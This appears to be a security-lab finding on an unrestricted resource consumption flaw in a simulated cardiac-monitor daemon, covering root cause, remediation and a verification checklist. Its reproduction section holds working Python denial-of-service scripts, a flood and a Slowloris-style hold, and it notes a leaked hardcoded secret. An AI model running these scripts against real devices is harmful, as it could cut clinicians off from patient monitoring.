---
id: API4:2023
title: Unrestricted Resource Consumption — careservice command-channel connection flood
category: API
status: DONE
severity: High
owasp: API4:2023 — Unrestricted Resource Consumption
cwe: CWE-770 (Allocation of Resources Without Limits or Throttling) / CWE-400 (Uncontrolled Resource Consumption) / CWE-799
source_docs:
  - CareOtter_Test_Suite.md §API-04
  - CareOtter_IoT.md (careservice IGP daemon)
affected_components:
  - labs/careotter/careservice.c
  - labs/careotter/files/etc/init.d/careservice
verified_date: 2026-06-02
---

# API4 — Unrestricted Resource Consumption (careservice command-channel flood)

> **OWASP:** API4:2023 — Unrestricted Resource Consumption
> **CWE:** CWE-770 / CWE-400 / CWE-799
> **Severity:** High

---

## Why It Matters

**Unrestricted Resource Consumption** occurs when an API serves requests without limits on rate, concurrency, or downstream resource use. An attacker who can send many cheap requests then consumes resources the service needs for legitimate clients — a denial of service.

CareOtter's device admin daemon `careservice` (the IGP binary protocol on TCP `:9999`) accepts connections **serially, with no rate limiting, no per-source quota, and a tiny listen backlog of 5**. Command `0x07 GET_VITALS` is moreover **unauthenticated** and opens a **fresh TCP connection to the local sensor service (`127.0.0.1:8081`) on every call**. Nothing bounds how fast, how often, or how many times a client may drive this.

Because the server is single-threaded and serves one connection at a time, a modest **connection flood** keeps `careservice` permanently busy. The demonstrable impact is a **denial of service of the device's command/admin channel**: legitimate IGP traffic is queued or refused, and the **cloud endpoints that proxy to the device** (`/api/device/status`, `/api/device/ping`, live status) time out. For a remote cardiac monitor this means clinicians **lose remote management and live visibility of the device** while the flood runs.

> **Secondary effect (measured, not assumed):** each `0x07` also drives a connection  to the single-threaded `sensor_service` (`:8081`), adding latency to the device's  own `/vitals` consumers (the cloud uploader, BLE). Whether this *fully* starves  vitals is throughput-dependent — `careservice`'s own serialism throttles the  amplification — so it is treated as a measured secondary effect, not the headline.

---

## Root Cause

1. **No throttling on the command API.** `careservice` applies no rate limit, no per-source quota, and no concurrency cap. `0x07` requires no authentication.
2. **Single-threaded, serial design with backlog 5.** `main()` runs `listen(s_fd, 5)` then `while(1){ accept(); handle_request(); close(); }`; one slow or flooding client blocks every other client.
3. **Unbounded downstream connections.** `0x07` opens a new `:8081` socket per call, with no connection pool or circuit breaker.
4. **Single-threaded downstream.** `sensor_service.py` serves `/vitals` from a plain `HTTPServer`, so it cannot absorb concurrency either (the amplifier).

```c
/* careservice.c main() — vulnerable accept loop (no throttling) */
if (listen(s_fd, 5) < 0) { perror("listen"); return 1; }
while (1) {
    int c_fd = accept(s_fd, NULL, NULL);   /* no per-source limit */
    if (c_fd < 0) continue;
    handle_request(c_fd);                  /* serial: blocks all others */
    close(c_fd);
}
```

`handle_request()` is **one-shot** — it reads exactly one command per connection and returns. So each command is a full new TCP connection (relevant to the exploit below).

5. **No read timeout on the accepted client socket.** `c_fd` is never given an
   `SO_RCVTIMEO` — the only `SO_RCVTIMEO` in the daemon is on the *downstream* `:8081`
   socket (`careservice.c:408`). Both client reads are single, blocking `recv()` calls:

```c
ssize_t got  = recv(c_fd, &hdr, sizeof(hdr), 0);   /* :223 — blocks forever if 0 bytes are sent      */
ssize_t pgot = recv(c_fd, payload, p_len, 0);      /* :250 — blocks forever until p_len bytes arrive  */
```

A client that connects and then withholds the bytes the server is waiting for blocks
`handle_request()` **indefinitely**. Combined with the serial accept loop (point 2),
**one** such connection never returns to `accept()` and freezes the entire daemon —
the enabler for the single-connection collapse (Technique B below).

---

## Affected Surface

| Surface | Vector | Effect |
|---------|--------|--------|
| `careservice` IGP `:9999` | Connection flood of `0x07` (unauthenticated) | Serial channel saturated → legit IGP/admin commands refused/queued |
| Cloud `/api/device/status`, `/api/device/ping` | Proxy to the saturated device | Time out / 503 → loss of remote monitoring |
| Sensor `:8081` | `0x07` amplification | Added `/vitals` latency for device consumers (secondary, measured) |

---

## Steps to Reproduce

> **Correction:** `careservice` closes the socket after **one** command, so an exploit that reuses a single socket for many commands does **not** work — only the first is processed. The real attack is **one connection per command**, and since `0x07` is unauthenticated, no `0x02` auth step is needed.

> **Obtaining the MAGIC `CARE`:** the attacker needs no source access or packet
> sniffing — a logged-in patient can leak it through the **API6 BFLA** threshold
> endpoint, whose `igp_request` field exposes the raw frame (first 4 bytes =
> `0x43415245`). See [API6_BFLA.md](API6_BFLA.md) → "Chain: leak the IGP MAGIC".
> (For Technique B's *valid*-`0x07` hold the magic is required; the zero-byte hold
> and the churn flood do not even need it.)

There are **two techniques**, with very different impact.

### Technique A — connection-churn flood (degrades, does *not* collapse)

```python
#!/usr/bin/env python3
import socket, struct, threading
TARGET, MAGIC = ("192.168.2.1", 9999), 0x43415245   # "CARE"

def flood():
    while True:
        s = socket.socket(); s.connect(TARGET)
        s.send(struct.pack(">IBBH", MAGIC, 0x07, 0, 0))   # one cmd, no auth
        try: s.recv(1024)
        except OSError: pass
        s.close()

for _ in range(20):                                  # 20 concurrent floods
    threading.Thread(target=flood, daemon=True).start()
import time; time.sleep(60)
```

This is the naive approach and it **does not bring the service down**. Each `0x07`
is serviced in well under a millisecond and the serial loop drains the backlog fast,
so a legitimate command merely queues behind it — measured impact is **added latency
(~1.6 s observed), not denial**. It is kept here only as the contrast that motivates
Technique B.

### Technique B — partial-frame hold / Slowloris (total collapse, ONE connection)

The effective attack does not rely on volume at all. Because the accepted socket has
**no read timeout** (see Root Cause #5), a connection that sends a *partial frame* and
then withholds the rest blocks `handle_request()` forever; the single-threaded serial
loop never returns to `accept()`, so the whole command channel is wedged. **One**
connection is sufficient; a small pool also fills the backlog (5) so new connects are
outright refused.

```python
#!/usr/bin/env python3
"""API4 — careservice command-channel COLLAPSE (partial-frame hold / Slowloris).

careservice reads the client socket with NO recv timeout (the 3s SO_RCVTIMEO at
careservice.c:408 is only on the downstream :8081 socket). Both client reads are
blocking single recv() calls — :223 (header) and :250 (payload). A connection that
sends a partial frame and then withholds the rest blocks there forever. main() is
serial — while(1){accept(); handle_request(); close();} (backlog 5) — so ONE stuck
handler never returns to accept(): the whole daemon is wedged. procd does NOT rescue
it (the process is blocked-in-recv, i.e. ALIVE, not crashed, so it is never
respawned). The outage lasts exactly as long as the attacker keeps the sockets open.
"""
import socket, struct, time

TARGET = ("192.168.2.1", 9999)
MAGIC  = 0x43415245            # "CARE" — leak it via the API6 BFLA chain (see API6_BFLA.md)
HOLD   = 8                     # > backlog(5); ONE connection already collapses the channel

def hold_withheld_payload():
    """Valid 8-byte header announcing a large payload, then send NO payload bytes.
       Blocks careservice.c:250 forever. (Needs the MAGIC.)"""
    s = socket.socket(); s.connect(TARGET)
    s.sendall(struct.pack(">IBBH", MAGIC, 0x07, 0, 0xFFFF))
    return s

def hold_zero_byte():
    """Connect and send NOTHING. Blocks careservice.c:223 forever. (No MAGIC needed.)"""
    s = socket.socket(); s.connect(TARGET)
    return s

held = [hold_withheld_payload() for _ in range(HOLD)]
print(f"[+] {len(held)} connections held — careservice serial loop is wedged.")
print("[+] Sending nothing more: the freeze IS the absence of further bytes.")
try:
    while True:
        time.sleep(3600)      # keep the sockets open; ANY byte sent would release a recv()
except KeyboardInterrupt:
    for s in held: s.close()
```



Verify **from a different host** with a public, no-auth command that has **no `:8081`
downstream** (`0x01 SYS_INFO`), so the hang is unambiguous and isolated from sensor
state:

![[ip4_dos_check.png]]

```bash
printf 'CARE\x01\x00\x00\x00' | nc -w 8 192.168.2.1 9999   # 0x01 SYS_INFO: hangs, no reply, while held
curl -s -m 5 http://<cloud>:5002/api/device/status         # cloud proxy times out / 503
```

> **Measured (host build of `careservice.c`):** baseline `0x01 SYS_INFO` returns in
> **0.1 ms**; with **one** withheld-payload connection held, `0x01` **times out at
> 5000 ms** (wedged); the instant the attacker disconnects it returns to **0.2 ms**.
> `procd` does **not** rescue the daemon — it is blocked in `recv()` (alive, not
> crashed), so it is never respawned; the outage lasts exactly as long as the hold.

---

## Expected Result

With the lab in vulnerable mode, the connection-churn flood (Technique A) keeps `careservice` busy and adds latency, while the partial-frame hold (Technique B) takes the command channel down **completely with a single connection**: legitimate IGP commands and cloud `/api/device/*` calls **time out or are refused** for as long as the hold is maintained. There is no rate limiting, no quota, **no read timeout**, and no logging that throttles the abusive source.

---

## How It Should Be

Apply **rate limiting / quotas at the command API** — the canonical API4 control.

### Implemented secure mode (`CARESERVICE_SECURE=1`)

`careservice` enforces a **per-source-IP token bucket** (burst 10, sustained 5 connections/sec). Excess connections from a flooding source are rejected with `ERR_RATE_LIMITED` **before any work** (no `:8081` connection, no parsing), so the serial channel stays available to legitimate clients from other IPs:

```c
/* secure mode only */
if (secure_mode && !rl_allow(peer.sin_addr.s_addr)) {
    send(c_fd, "ERR_RATE_LIMITED", 16, 0);
    close(c_fd);
    continue;
}
```

The toggle is the careotter device's first secure/vulnerable switch: the init.d launcher reads `uci get careotter.@careotter[0].secure_mode` (default `0` = vulnerable) and passes `CARESERVICE_SECURE` to the binary via `procd_set_param env`.

### Further hardening (defense in depth)
1. **Set a read timeout on the accepted socket** (`SO_RCVTIMEO` on `c_fd`) and/or a whole-request deadline, so a client that withholds bytes is dropped instead of blocking the serial loop. This is the specific control for the Technique B hold — the per-source **rate** limiter does *not* cover it, since one slow connection is under any rate threshold. Pair it with bounded concurrency so a single slow client cannot monopolize the server.
2. Cap concurrent in-flight connections; use a bounded connection pool / circuit breaker for the `:8081` calls (timeout already present: `SO_RCVTIMEO` 3s).
3. Make `sensor_service` a `ThreadingHTTPServer` with a bounded worker semaphore.
4. Require authentication for `0x07`, and add audit logging of throttled sources.

---

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Rate limiting | Per-source-IP token bucket on the command channel | Stop a single source from monopolizing the serial server |
| Concurrency | Bounded in-flight cap + connection pool to `:8081` | Prevent downstream amplification |
| Availability | Threaded, bounded `sensor_service` | Absorb concurrent `/vitals` load |
| Auth | Authenticate `0x07`; log throttled sources | Reduce the unauthenticated attack surface + enable forensics |

---

## Verification Checklist

- [ ] Vulnerable mode (`CARESERVICE_SECURE` unset/0): a connection flood of `0x07`
      (Technique A) saturates `:9999` and adds latency to a legit `/api/device/status`.
- [ ] Vulnerable mode: a **single** partial-frame hold (Technique B — withheld payload,
      or zero bytes after connect) wedges the daemon; a legit `0x01 SYS_INFO` from
      another host hangs until the attacker disconnects.
- [ ] Secure mode (`=1`): the flood source is throttled (`ERR_RATE_LIMITED` after the
      burst); a legit command from a **different** source IP still succeeds in budget.
- [ ] Gap: secure mode's per-source **rate** limiter stops Technique A but **not**
      Technique B — one slow connection is under any rate threshold (see *How It Should Be*).
- [ ] `0x07` confirmed unauthenticated (no `0x02` needed for the flood).
- [ ] Binary builds with `aarch64-openwrt-linux-musl-gcc -static -Wno-format-security`
      and is **not** stripped (`OtterMobile2026` still leaks via `strings`).

---

## References

- `CareOtter_Test_Suite.md` §API-04
- `labs/careotter/careservice.c` (`main` accept loop, `rl_allow`, `0x07`)
- `labs/careotter/files/etc/init.d/careservice` (the `CARESERVICE_SECURE` toggle)
- `labs/careotter/files/opt/medical-sensor/sensor_service.py` (single-threaded `HTTPServer`)
